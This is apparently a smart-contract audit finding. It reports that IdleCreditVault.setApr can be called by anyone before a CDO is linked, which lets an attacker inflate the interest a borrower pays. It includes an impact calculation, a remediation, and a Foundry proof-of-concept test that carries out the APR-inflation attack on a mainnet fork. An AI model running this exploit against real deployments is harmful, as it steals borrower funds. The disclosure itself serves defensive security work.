### Title
Unauthenticated APR configuration before CDO linking allows attackers to inflate borrower interest - (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` disables caller validation whenever `idleCDO == address(0)`. This creates an unauthenticated setup window between strategy initialization and `setWhitelistedCDO`. An attacker can overwrite the configured borrower APR during that window. `IdleCDOEpochVariant` subsequently treats the malicious value as the unscaled APR and scales it again during initialization.

### Finding Description
`initialize` records the intended APR in `lastApr` and `unscaledApr`. Before a CDO is linked, `setApr` skips the `msg.sender == idleCDO || msg.sender == manager` check entirely, allowing any EOA to modify `lastApr`; `setAprs` also modifies `unscaledApr` before invoking `setApr`.

`IdleCDOEpochVariant._additionalInit` reads `_getStrategyApr()` and calls `_setScaledApr`, which applies the epoch-plus-buffer scaling. Therefore, if the attacker sets the unscaled APR to approximately `maxApr * epochDuration / (epochDuration + bufferPeriod)`, CDO initialization raises `lastApr` to the maximum permitted value. At `startEpoch`, this inflated APR determines `expectedEpochInterest`, and `stopEpoch` pulls that amount from the honest borrower.

The factory path configures the contracts atomically, but the strategy remains independently initializable and explicitly supports this “CDO not yet set” setup window. There is no nonce, deadline, initialization marker, or privileged caller check preventing an attacker from winning the race between strategy initialization and CDO deployment/linking.

### Impact Explanation
For a 30-day epoch, 5-day buffer, and 20% maximum APR, an attacker can replace a 10% APR with approximately 17.142857% before CDO initialization. The CDO then scales it to nearly 20%. On 1,000,000 USDC of deposits, the borrower pays approximately 16,438 USDC for the epoch instead of approximately 8,219 USDC, producing roughly 8,219 USDC of excess interest. If the attacker is an eligible lender, they directly receive the inflated yield through their tranche position.

This is theft of borrower-funded yield rather than a temporary denial of service.

### Likelihood Explanation
The attack requires a non-atomic deployment/configuration sequence where `idleCDO` remains unset. In that supported setup state, the vulnerable setter is publicly callable and the attacker can monitor the mempool or act immediately after strategy initialization. They can then pass KYC if required and deposit before the first epoch starts.

The canonical factory deployment avoids the race by configuring and linking the contracts in one transaction. Manual proxy deployments or deployments split across multiple transactions remain exposed.

### Recommendation
Do not make `setApr`, `setAprs`, or `setAprsWithBuffer` publicly callable when `idleCDO == address(0)`. Restrict those functions to `owner` or `manager` during setup, or add a dedicated one-time initialization/configuration function. Alternatively, initialize `idleCDO` atomically with the strategy configuration and make later CDO assignment impossible after privileged APR setters become active.

After linking the CDO, continue enforcing `msg.sender == idleCDO || msg.sender == manager`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

import "../contracts/IdleCDO.sol";
import "../contracts/IdleCDOEpochVariant.sol";
import "../contracts/IdleCDOTranche.sol";
import "../contracts/interfaces/IERC20Detailed.sol";
import "../contracts/strategies/idle/IdleCreditVault.sol";

contract PermissionlessAprSetupPoC is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");

    uint256 constant INTENDED_APR = 10e18;
    uint256 constant DEPOSIT = 1_000_000e6;

    function testAttackerInflatesAprBeforeCdoIsLinked() public {
        vm.createSelectFork("mainnet");

        IERC20Detailed underlying = IERC20Detailed(USDC);

        IdleCreditVault strategy = new IdleCreditVault();
        stdstore
            .target(address(strategy))
            .sig(strategy.token.selector)
            .checked_write(address(0));

        strategy.initialize(
            USDC,
            owner,
            manager,
            borrower,
            "Borrower",
            INTENDED_APR
        );

        // Unprivileged preemptive setup transaction while idleCDO == 0.
        uint256 hostileUnscaledApr =
            strategy.maxApr() * 30 days / 35 days;

        vm.prank(attacker);
        strategy.setAprs(hostileUnscaledApr, hostileUnscaledApr);

        IdleCDOEpochVariant cdo = new IdleCDOEpochVariant();
        stdstore
            .target(address(cdo))
            .sig(cdo.token.selector)
            .checked_write(address(0));

        // CDO initialization treats the attacker-controlled lastApr as
        // unscaled APR and scales it by (30 days + 5 days) / 30 days.
        vm.prank(owner);
        cdo.initialize(
            0,
            USDC,
            owner,
            owner,
            makeAddr("rebalancer"),
            address(strategy),
            100_000
        );

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        vm.prank(owner);
        cdo.setKeyringParams(address(0), 0);

        assertApproxEqAbs(strategy.getApr(), strategy.maxApr(), 1);

        deal(USDC, attacker, DEPOSIT);
        vm.startPrank(attacker);
        underlying.approve(address(cdo), DEPOSIT);
        cdo.depositAA(DEPOSIT);
        vm.stopPrank();

        vm.prank(manager);
        cdo.startEpoch();

        uint256 expectedInterest = cdo.expectedEpochInterest();
        uint256 honestInterest =
            DEPOSIT *
            (INTENDED_APR * (30 days + 5 days) / 30 days) *
            30 days /
            365 days /
            1e18;

        assertGt(expectedInterest, honestInterest);

        deal(USDC, borrower, expectedInterest);
        vm.prank(borrower);
        underlying.approve(address(cdo), expectedInterest);

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        assertEq(underlying.balanceOf(address(strategy)), expectedInterest);
    }
}
```
